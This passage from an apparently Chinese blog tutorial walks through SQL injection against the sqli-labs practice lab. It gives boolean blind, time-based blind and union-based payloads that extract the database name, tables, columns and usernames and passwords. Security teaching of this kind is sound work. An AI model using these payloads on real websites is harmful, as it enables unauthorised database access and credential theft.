class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.判断当前数据库名的长度</span><br><span class="line">id=1&#x27; and length(database())=8 --+  //有回显</span><br><span class="line">判断到等于8时出现You are in....说明语句执行正确，当前数据库长度为8个字符</span><br><span class="line"></span><br><span class="line">2.判断当前数据库名</span><br><span class="line">//判断数据库的第一个字符</span><br><span class="line">id=1&#x27; and ascii(substr(database(),1,1))=115 --+</span><br><span class="line">//判断数据库的第二个字符</span><br><span class="line">id=1&#x27; and ascii(substr(database(),2,1))=101 --+</span><br><span class="line">//判断数据库的第三个字符</span><br><span class="line">id=1&#x27; and ascii(substr(database(),3,1))=99 --+</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">数据库为 security</span><br></pre></td></tr></table></figure><p><strong>获取当前库的表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">判断每个表名的每个字符的ascii值</span><br><span class="line">//判断第一个表的第一个字符</span><br><span class="line">id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+</span><br><span class="line"></span><br><span class="line">//判断第一个表的第二个字符</span><br><span class="line">id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109 --+</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">判断出存在表 emails、referers、uagents、users </span><br></pre></td></tr></table></figure><p><strong>获取表的字段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">猜测users表比较重要，先查询users表</span><br><span class="line">//判断第一个字段的第一个字符</span><br><span class="line">id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=117 --+</span><br><span class="line"></span><br><span class="line">//判断第一个字段的第二个字符</span><br><span class="line">id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),2,1))=115 --+</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">users表中存在 id、username、password 字段</span><br></pre></td></tr></table></figure><p><strong>获取字段中的数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//判断id字段的第一行数据的第一个字符</span><br><span class="line">id=1&#x27; and ascii(substr((select id from users limit  0,1),1,1))=100 --+</span><br><span class="line">//判断id字段的第二行数据的第二个字符</span><br><span class="line">id=1&#x27; and ascii(substr((select id from users limit 0,1),2,1))=100 --+</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>手工去盲注太过繁琐，不建议手工注入，可借助工具或者写脚本跑</p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>时间盲注也叫<strong>延迟注入</strong>。在页面没有回显数据，也没有可以充当判断条件的地方，也没有报错信息，就可以考虑尝试时间盲注。时间盲注就是将页面的反响时间作为判断依据，来注入出数据库的信息。</p><p>以Less-9为例，当我们以id&#x3D;1’ and sleep(5) –+ 进行注入，可以明显的感觉到页面返回响应的时间变长了，大概拉长了5秒左右，这说明构造的sleep(5)语句起作用了。我们可以把这个当作判断依据，配合if语句使用。</p><p>if(a,b,c) 如果a的值为true，则返回b的值，如果a的值为false，则返回c的值。</p><p><strong>获取数据库名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//查询数据库名第一个字符</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+</span><br><span class="line">明显感受到页面延迟了几秒，说明数据库名字第一个字符是s。</span><br><span class="line">//查询数据库名第二个字符</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),2,1))= 101,sleep(5),0) --+</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>与盲注类似，后面就是爆破字符，再爆表名，字段名，具体数据。</p><p>不建议手注，建议编写脚本或使用工具</p><h3 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h3><p><strong>第一步</strong>，测试注入点，一些小技巧：利用引号，and 1&#x3D;1 ，or 1&#x3D;1 等判断是字符型还是数字型</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/c29b373007f5c9ec.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/c29b373007f5c9ec.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>正常返回判断是字符型</p><p><strong>第二步</strong>，利用order by 查表得到到字段个数</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/4476b9da124a50d6.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/4476b9da124a50d6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/75b3fcab817513f8.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/75b3fcab817513f8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>查到3时正常返回但到4时报错说明当前表中只有三列</p><p><strong>第三步</strong>，利用union select 1,2,3..判断回显位，如果有回显，找到回显位，回显位也就是回显页面有我们设置的1,2,3的位置</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/63630a55027325b4.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/63630a55027325b4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>发现者里有2和3的回显位,在name和Password回显</p><p><strong>第四步</strong>，爆库，爆表，爆字段名，爆值</p><p>为什么用-1 ：因为-1大概率会返回空表，union select联合查询会返回一张表，就只会显示后面联合查询表</p><p>组合使用上面提到的常用的payload，放在页面回显位上</p><p><code>-1&#39; union select 1,(select database()),3 --+</code></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/7061e7b7819e2b40.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/7061e7b7819e2b40.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><code>-1&#39; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3 --+</code></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/0cebe315f9203cec.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/0cebe315f9203cec.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>爆出4个表，选择爆users表</p><p><code>-1&#39; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39;),3 --+</code></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/e0e70749fe594d15.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/e0e70749fe594d15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>发现查询出了很多字段应该爆错了不是我们需要的那个表，可能其他库里也有users表，这样要加一条限制语句，查security库里的users表</p><p><code>-1&#39; union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),3 --+</code></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/8c414407018310c2.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/8c414407018310c2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>爆字段的数据</p><p><code>-1&#39; union select 1,(select group_concat(id,username,password) from users),3 --+</code></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/b39f3864d2e582ae.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/b39f3864d2e582ae.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,(select database()),3 --+</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),3 --+</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>),<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(id,username,password) from users),3 --+</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入,安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
